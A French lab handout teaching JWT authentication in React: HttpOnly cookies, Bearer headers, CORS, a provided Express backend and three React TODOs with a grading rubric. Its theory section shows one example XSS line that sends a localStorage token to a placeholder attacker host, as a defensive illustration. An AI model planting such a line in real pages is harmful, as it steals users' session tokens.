---
title: TP Authentification avec React
lang: fr
---

# 🔐 Authentification avec React - de bout en bout

Ce TP se fait **seul**. Objectif : comprendre **tout le trajet** d'une authentification web
moderne - du formulaire React jusqu'à la route d'API protégée - et le câbler toi-même côté
front.

Le **backend est fourni, complet et fonctionnel**. Tu ne le codes pas : tu l'étudies (pour
savoir _à quoi_ tu parles), puis tu écris les **3 morceaux manquants côté React**.
{: .alert-info}

À la fin, tu dois savoir répondre à la question :
**« quand je suis connecté, qu'est-ce qui prouve au serveur que c'est bien moi, à chaque
requête - et où est stockée cette preuve ? »**

Le code (starter) est ici : [{{ site.code_repo }}]({{ site.code_repo }})

## 🎯 Ce que tu vas travailler

- La différence **session serveur** vs **token (JWT)**, et l'**anatomie d'un JWT**.
- Pourquoi on **ne stocke pas** le token dans `localStorage`, et ce qu'on utilise à la place
  (un **cookie `HttpOnly`**).
- Le rôle du header **`Authorization: Bearer`** et quand il sert.
- Côté React : un **`AuthContext`**, une **route protégée** (`ProtectedRoute`), un
  **formulaire de connexion**, et l'appel `fetch` qui transporte le cookie.
- **CORS** entre un front et une API sur deux origines différentes.

Prérequis : `useState`, `useEffect`, `fetch`, `react-router-dom`, et l'**API Context**
(`createContext` / `useContext` / `Provider`).
{: .alert-warning}

---

# Partie 1 - La théorie (à lire)

**_15 minutes_**

## 🧩 Session serveur vs token

| Approche                        | Ce que le serveur retient                                                 | Ce que le client renvoie à chaque requête      |
| ------------------------------- | ------------------------------------------------------------------------- | ---------------------------------------------- |
| Session classique               | un identifiant de session **stocké côté serveur** (mémoire / BDD / Redis) | un cookie `sessionId` opaque                   |
| **Token (JWT)** - _notre choix_ | **rien** (`stateless`)                                                    | un **JWT signé**, ici transporté par un cookie |

Avec un **JWT**, le serveur ne garde qu'un **secret**. Il ne stocke aucune session : il
**re-signe** le contenu reçu et compare à la signature. Si ça correspond, la preuve est
authentique. Avantages : rien à stocker, ça passe à l'échelle. Inconvénient : on ne peut pas
« annuler » un token avant son expiration (on y revient plus loin).

## 🔬 Anatomie d'un JWT

Un JWT est une chaîne en **trois parties** séparées par des points :

```
xxxxx.yyyyy.zzzzz
  │     │     └── signature = HMAC-SHA256( header + "." + payload , SECRET )
  │     └──────── payload : { "sub": "0f8c…", "email": "alice@ynov.com", "iat": …, "exp": … }
  └────────────── header  : { "alg": "HS256", "typ": "JWT" }
```

- Le header et le payload sont juste encodés en **Base64URL** - **pas chiffrés**.
  N'importe qui peut lire le payload.
- La **signature** dépend du `SECRET`. Si on modifie le payload, la signature ne correspond
  plus, et le serveur **rejette** le token. Sans le secret, impossible d'en forger un.

Ouvre <https://jwt.io>, colle un vrai token (tu en auras un en Partie 2) et observe : tu vois
`sub`, `email`, `exp` en clair. **Conclusion : on ne met jamais de donnée sensible dans un
JWT.**
{: .alert-warning}

## 🍪 Où stocker le token dans le navigateur ?

| Emplacement                           | Lisible en JS ? | Volé par une faille XSS ? | Envoyé automatiquement ? |
| ------------------------------------- | :-------------: | :-----------------------: | :----------------------: |
| `localStorage`                        |     ✅ oui      |    ✅ **oui, trivial**    |   ❌ non (code manuel)   |
| Variable JS / state                   |     ✅ oui      |          ✅ oui           |          ❌ non          |
| **Cookie `HttpOnly`** - _notre choix_ |   ❌ **non**    |        ❌ **non**         |        ✅ **oui**        |

Une faille **XSS** (un `<script>` injecté dans la page) peut exécuter
`fetch('https://attaquant.tld?t=' + localStorage.token)`. Avec un cookie `HttpOnly`,
`document.cookie` ne renvoie **rien** : le token est hors de portée du JavaScript, donc hors
de portée du script malveillant.

C'est **la raison** pour laquelle ce TP interdit `localStorage` et passe par un cookie
`HttpOnly` que **seul le serveur** peut poser et lire.
{: .alert-info}

### Les attributs du cookie

```
Set-Cookie: token=eyJ…; Max-Age=3600; Path=/; HttpOnly; SameSite=Lax
```

- `HttpOnly` → inaccessible à `document.cookie` (anti-XSS).
- `SameSite=Lax` → pas envoyé sur les requêtes déclenchées par un **autre site** (anti-CSRF de base).
- `Secure` → (en production) cookie transmis uniquement en HTTPS.
- `Max-Age` → durée de vie, alignée sur l'`exp` du JWT.

## 🪪 Et `Authorization: Bearer` ?

C'est le **standard** pour présenter un token à une API (RFC 6750) :

```
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIwZjhj…
```

Un **navigateur** qui utilise notre cookie n'en a pas besoin : le cookie part tout seul.
Mais **Postman**, **`curl`**, **une app mobile** ou **une autre API** n'ont pas de cookies :
ils mettent le token dans ce header. Le backend de ce TP accepte **les deux** - tu le
vérifieras dans Postman.

---

# Partie 2 - Le backend fourni (à comprendre)

**_30 minutes_**

## 🚀 Mise en route

```bash
git clone {{ site.code_repo }}
cd {{ site.code_repo }}/starter
# …/starter dans le dépôt cloné
npm install          # installe le front ET le back (npm workspaces)
npm run dev          # API sur :3001  +  front React sur :5173
```

Comptes de test : `alice@ynov.com` / `bob@ynov.com` - mot de passe `password123`.

Ouvre le dossier `starter/server/src/` dans ton éditeur : c'est le code qu'on décrit
ci-dessous. **Tu ne le modifies pas**, tu le lis.
{: .alert-warning}

## A.0 · Pourquoi un serveur ?

Le navigateur ne peut **rien garder de secret**. Trois opérations **doivent** donc se faire
côté serveur : **comparer** le mot de passe au hash en base, **fabriquer** une preuve
d'identité signée avec un secret, **vérifier** cette preuve à chaque requête. Le front ne
fait qu'afficher un formulaire et se laisser transporter le token par le navigateur.

## A.1 · Les utilisateurs - `db.ts` (lowdb)

Pas de vraie base : `lowdb` lit/écrit `server/db.json`. Au premier lancement, deux comptes
sont créés.

👉 **Ouvre `server/db.json`** après le premier `npm run dev`. Repère le champ
**`passwordHash`** (`$2b$10$…`) : il n'y a **jamais** de mot de passe en clair. Si la base
fuite, les comptes ne sont pas immédiatement compromis.

## A.2 · Le hachage - `auth/password.ts` (bcrypt)

```ts
hashPassword(plain); // "$2b$10$…"   - au seed / à l'inscription
verifyPassword(plain, hash); // true / false - au login
```

À retenir sur **bcrypt** :

- **sens unique** : on ne « déchiffre » pas un hash ; on re-hache la saisie et on compare.
- **sel intégré** : deux fois `password123` → deux hash **différents** (pas de rainbow tables).
- **lent volontairement** (`cost = 10` → 2¹⁰ itérations) : négligeable pour un login,
  ruineux pour du brute-force massif.

## A.3 · Le token - `auth/jwt.ts`

```ts
signToken({ sub, email }); // → le JWT (avec iat + exp ajoutés par expiresIn: '1h')
verifyToken(token); // → { sub, email }  ou LÈVE une erreur si signature/exp KO
```

- `sub` = l'id de l'utilisateur (convention JWT).
- **stateless** : le serveur ne stocke aucune session, il ne garde que `JWT_SECRET`.
- modifie un caractère du token → `verifyToken` lève → `401`.

👉 **Expérience** : récupère un token (voir A.10), colle-le sur <https://jwt.io>, lis le
payload. Puis change une lettre dans la partie payload de la chaîne et re-teste `GET /auth/me` :
`401`.

## A.4 · `POST /auth/login` - `routes/auth.routes.ts`

```
{ email, password }
  1. champs présents ?                        sinon → 400
  2. findUserByEmail(email)
  3. verifyPassword(password, user.passwordHash)
     └─ user inconnu OU mauvais mdp → 401 { error: "Identifiants invalides" }
        (⚠️ MÊME message : on ne révèle pas si l'email existe - anti-énumération)
  4. token = signToken({ sub: user.id, email: user.email })
  5. res.cookie("token", token, COOKIE_OPTIONS)   ← le token part dans un COOKIE
  6. res.json({ user: { id, email, name } })       ← JAMAIS le passwordHash
```

**Le token n'est pas dans le corps JSON.** Il est dans l'en-tête `Set-Cookie`. Le front reçoit
seulement `{ user }` (pour afficher un nom) et ne voit **jamais** le token.

## A.5 · Le cookie posé par le serveur

```
Set-Cookie: token=eyJ…; Max-Age=3600; Path=/; HttpOnly; SameSite=Lax
```

| Attribut        | Effet                                                                |
| --------------- | -------------------------------------------------------------------- |
| `HttpOnly`      | invisible à `document.cookie` → un script ne peut pas voler le token |
| `SameSite=Lax`  | pas envoyé depuis un autre site → anti-CSRF de base                  |
| `Secure` (prod) | HTTPS uniquement                                                     |
| `Max-Age=3600`  | 1 h, comme l'`exp` du JWT                                            |

Côté front, **tu ne gères pas le token**. Tu ne le lis pas, tu ne l'ajoutes pas. Le navigateur
l'envoie seul… **si** tu lui dis `credentials: 'include'` (ton **TODO 1**).

## A.6 · Le middleware `requireAuth` - `auth/middleware.ts`

Placé **devant** chaque route protégée :

```
1. token = req.cookies.token                 (navigateur)
        OU  header "Authorization: Bearer …"  (Postman / curl / mobile / autre API)
2. pas de token       → 401 "Non authentifié"
3. verifyToken(token) → lève ? → 401 "Token invalide ou expiré"
4. req.user = { id: payload.sub, email: payload.email }
5. next()             → la route s'exécute, req.user est garanti
```

Les deux sources transportent **le même JWT**. Le cookie est pratique pour le navigateur ;
le header `Bearer` est le standard pour tout le reste.

## A.7 · `POST /auth/logout`

`res.clearCookie("token")` → le navigateur supprime le cookie, réponse `204`. Le JWT reste
**techniquement valide jusqu'à son `exp`** (le serveur, stateless, ne peut pas le « barrer »),
mais le navigateur ne l'a plus. Invalidation immédiate = _denylist_ côté serveur → hors
périmètre.

## A.8 · `GET /auth/me` - la clé du « rester connecté »

Route protégée qui renvoie le profil du porteur du token. Le front l'appelle **au chargement
de la page** :

- `200` → un cookie valide existe → on **restaure la session** sans re-login → **survit au F5** ;
- `401` → pas connecté (cas normal).

## A.9 · CORS - `index.ts`

Front sur `:5173`, API sur `:3001` = **deux origines**. Le navigateur bloque par défaut. Le
serveur autorise explicitement :

```ts
app.use(
	cors({
		origin: config.clientOrigin, // origine PRÉCISE (jamais "*" avec des cookies)
		credentials: true, // → Access-Control-Allow-Credentials: true
	}),
);
```

Avant un `POST`, le navigateur envoie une requête `OPTIONS` de **préflight**. Le pendant
front de `credentials: true`, c'est `fetch(..., { credentials: 'include' })` → **TODO 1**.

## A.10 · Tester l'API sans le front

```bash
# login : -c enregistre le cookie dans cookies.txt
curl -i -c cookies.txt -H 'Content-Type: application/json' \
  -d '{"email":"alice@ynov.com","password":"password123"}' \
  http://localhost:3001/auth/login          # → 200 + Set-Cookie

curl -i -b cookies.txt http://localhost:3001/auth/me   # → 200 + { user }
curl -i               http://localhost:3001/auth/me    # → 401

curl -i -H 'Content-Type: application/json' \
  -d '{"email":"alice@ynov.com","password":"nope"}' \
  http://localhost:3001/auth/login                     # → 401 "Identifiants invalides"
```

👉 **Refais le login dans Postman, Bruno, ou autre.** Récupère la valeur du cookie `token` (onglet _Cookies_),
puis appelle `GET /auth/me` **sans cookie** mais avec un header
`Authorization: Bearer <la valeur du token>` → tu obtiens `200`. Même preuve, autre transport.

## ✅ Point de contrôle Partie 2

Avant de coder, tu dois pouvoir expliquer à voix haute :

- pourquoi `passwordHash` et pas `password` en base ;
- ce que contient le payload d'un JWT et pourquoi ce n'est pas secret ;
- ce qui rend le token infalsifiable ;
- ce que fait `HttpOnly` et pourquoi ça remplace `localStorage` ;
- ce que `requireAuth` vérifie exactement ;
- pourquoi `GET /auth/me` permet de rester connecté après un F5.

---

# Partie 3 - Le travail React

**_1 heure_**

## L'état fourni : `AuthContext`

`starter/client/src/auth/AuthContext.tsx` est **déjà écrit et commenté**. Lis-le. Il expose,
via `useAuth()` :

| Membre                   | Rôle                                                  |
| ------------------------ | ----------------------------------------------------- |
| `user`                   | le profil (`{ id, email, name }`) ou `null`           |
| `status`                 | `'loading'` → puis `'authenticated'` ou `'anonymous'` |
| `login(email, password)` | `POST /auth/login`, puis met `user` / `status` à jour |
| `logout()`               | `POST /auth/logout`, puis remet `user` à `null`       |

Au montage, le provider appelle **`GET /auth/me`** une fois : c'est le mécanisme du
« rester connecté » décrit en A.8.

Tout le reste du front est fourni : `App.tsx` (routes déjà branchées), `Navbar.tsx`,
`HomePage.tsx`, `ProfilePage.tsx`. Il te reste **3 points**.
{: .alert-info}

## 🔹 TODO 1 · `src/api/client.ts` - envoyer le cookie

**_10 minutes_**

Le wrapper `fetch` est écrit ; il manque **une ligne**. Dans l'objet passé à `fetch`, ajoute :

```ts
credentials: 'include',
```

**Pourquoi.** Front (`:5173`) et API (`:3001`) sont sur deux origines. Par défaut, le
navigateur **n'attache pas** les cookies en cross-origin. `credentials: 'include'` l'y
autorise (le serveur, lui, répond déjà `Access-Control-Allow-Credentials: true`, cf. A.9).

**Vérif.** Après avoir fait aussi le TODO 3, connecte-toi et ouvre l'onglet _Network_ :
la requête `me` part avec un `Cookie: token=…` et répond `200`. Sans la ligne → `401` partout.

## 🔹 TODO 2 · `src/auth/ProtectedRoute.tsx` - garder la route

**_15 minutes_**

Aujourd'hui le composant fait `return <Outlet />` : **il ne protège rien**. Ouvre `/profile`
sans être connecté → la page s'affiche quand même.

À écrire à partir de `status` :

```tsx
if (status === "loading") return <p className="p-8 text-center">Chargement…</p>;
if (status === "anonymous") return <Navigate to="/login" replace />;
return <Outlet />;
```

- `'loading'` : le `/auth/me` du contexte n'a pas encore répondu → on **attend**. Si on
  redirigeait tout de suite, on éjecterait un utilisateur pourtant connecté à **chaque F5**.
- `'anonymous'` : pas de session → `/login`.
- sinon : `<Outlet />` rend la route enfant (`ProfilePage`).

C'est déjà câblé dans `App.tsx` :

```tsx
<Route element={<ProtectedRoute />}>
	<Route path="/profile" element={<ProfilePage />} />
</Route>
```

**Vérif.** Déconnecté : `/profile` → redirige vers `/login`. Connecté : `/profile` s'affiche.

## 🔹 TODO 3 · `src/pages/LoginPage.tsx` - soumettre le formulaire

**_15 minutes_**

Le formulaire contrôlé est écrit (`email`, `password`, `error`, `submitting`). Remplis
`handleSubmit` (après `e.preventDefault()`) :

```ts
setError(null);
setSubmitting(true);
try {
	await login(email, password); // le contexte fait le POST et pose l'état
	navigate("/profile"); // succès → page protégée
} catch (err) {
	setError(err instanceof ApiError ? err.message : "Erreur");
} finally {
	setSubmitting(false);
}
```

**Vérif.** `alice@ynov.com` / `password123` → arrivée sur `/profile`. Mauvais mot de passe →
message `Identifiants invalides` (venu de l'API, cf. A.4).

---

# Partie 4 - Validation

**_10 minutes_**

Déroule ce scénario en entier :

1. `/profile` sans être connecté → redirige vers `/login`. _(TODO 2)_
2. Login `alice@ynov.com` / `password123` → arrivée sur `/profile`, ton email s'affiche. _(TODO 1 + 3)_
3. **F5** (rechargement complet) → **toujours connecté**. _(`/auth/me` + cookie)_
4. Console → `document.cookie` → **chaîne vide**. Le cookie `token` est `HttpOnly` : le JS ne
   le voit pas → un script malveillant non plus. _(← la raison du « pas de `localStorage` »)_
5. Sur `/profile`, bouton **« Rappeler `GET /auth/me` »** → `200`, sans qu'on ait touché au token.
6. **Se déconnecter** → cookie supprimé, `/profile` redirige de nouveau vers `/login`.
7. **Postman** : `POST /auth/login`, récupère le token, `GET /auth/me` avec
   `Authorization: Bearer <token>` → `200`. Même preuve, autre transport.

---

# 🎁 Bonus (si tu as fini en avance)

Tous **simples**, à choisir selon l'envie :

- **Redirection intelligente** : après login, revenir sur la page initialement demandée
  (au lieu de toujours `/profile`) - `useLocation()` + `state.from` passé par `ProtectedRoute`.
- **Inscription** : une page `/register` (copie de `LoginPage`) + une route serveur
  `POST /auth/register` (≈ 5 lignes : `hashPassword`, `db.data.users.push`, `db.write`,
  `signToken`, `res.cookie`).
- **Affichage conditionnel** : masquer le lien « Profil » de la `Navbar` quand on est
  `anonymous` (inspire-toi de ce qui y est déjà fait).
- **Expiration** : baisse `jwtExpiresInSeconds` à `30` côté serveur, observe le passage en
  `401` après 30 s, et fais afficher un message propre côté front.

---

# 📋 Évaluation (/20)

| Ce qu'on regarde                                                                       | Points  |
| -------------------------------------------------------------------------------------- | :-----: |
| Le projet démarre (`npm run dev`), front + API OK, `node_modules` non commité          |    2    |
| **TODO 1** - `credentials: 'include'`, la requête porte bien le cookie                 |    3    |
| **TODO 2** - `ProtectedRoute` gère les 3 états (`loading` inclus) et redirige          |    5    |
| **TODO 3** - `handleSubmit` : appel à `login`, gestion d'erreur, redirection           |    4    |
| Le **scénario de validation** (Partie 4) passe en entier, F5 compris                   |    3    |
| **Compréhension** : tu sais expliquer JWT / cookie `HttpOnly` / `requireAuth` / Bearer |    3    |
| **Total**                                                                              | **/20** |

Rends : le lien de ton dépôt (branche `prenom_NOM`), un `README.md` avec la commande de
lancement, et le code du `starter` complété.
{: .alert-warning}

---

# ☝️ Récap

Reformule pour toi-même, sans regarder :

- le **trajet complet** login → cookie → requête suivante → `requireAuth` ;
- **trois** raisons de préférer un cookie `HttpOnly` à `localStorage` ;
- **une** limite du modèle stateless (JWT non révocable avant `exp`) ;
- **où** vit le token à chaque instant (jamais dans ton code React).

Si un de ces points est encore flou, relis la Partie 2 et compare avec `solution/` dans le
dépôt de code.
